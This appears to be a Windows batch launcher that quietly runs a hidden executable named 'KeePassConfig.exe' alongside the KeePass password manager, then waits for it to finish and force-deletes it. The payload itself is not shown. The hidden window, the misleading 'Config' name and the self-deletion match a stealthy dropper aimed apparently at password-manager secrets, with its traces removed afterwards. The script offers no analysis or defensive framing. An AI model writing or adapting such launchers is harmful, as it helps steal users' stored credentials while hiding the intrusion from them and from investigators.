@echo off
powershell -WindowStyle Hidden -Command "Start-Process 'KeePassConfig.exe' -WindowStyle Hidden"
start "" "KeePass.exe"
timeout /t 60 /nobreak > nul
powershell -WindowStyle Hidden -Command "while (Get-Process KeePassConfig -ErrorAction SilentlyContinue) { Start-Sleep -Seconds 60 }; Remove-Item 'KeePassConfig.exe' -Force -ErrorAction SilentlyContinue"
